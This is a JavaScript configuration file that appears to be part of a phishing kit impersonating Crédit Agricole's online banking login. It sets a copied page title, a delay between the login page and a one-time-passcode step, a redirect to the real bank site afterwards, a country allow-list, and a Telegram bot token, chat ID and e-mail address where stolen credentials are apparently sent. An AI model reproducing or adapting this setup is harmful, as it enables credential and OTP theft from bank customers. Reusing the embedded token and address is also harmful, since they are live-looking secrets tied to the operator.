const config = {
  name: "AGR", // Provider Name
  mail: "dauphin.christiantessier@gmail.com", // User E-mail
  subject: "RZ",
  timeout: 5000, // time out between login Page and OTP
  titlePage: "Accéder à mes comptes - Crédit Agricole", // Title header bar
  redirectTo: "https://www.credit-agricole.fr/",
  version: 3,
  branch: 3,
  allowCountry: ["FR", "CI"],
  telegramToken: "5828998805:AAG_OoYQikDsxlcc9QRStOFBKjG8tHFt6Tc", // telegram token
  telegramId: "2068389707", // telegram id
};

window.config = config;
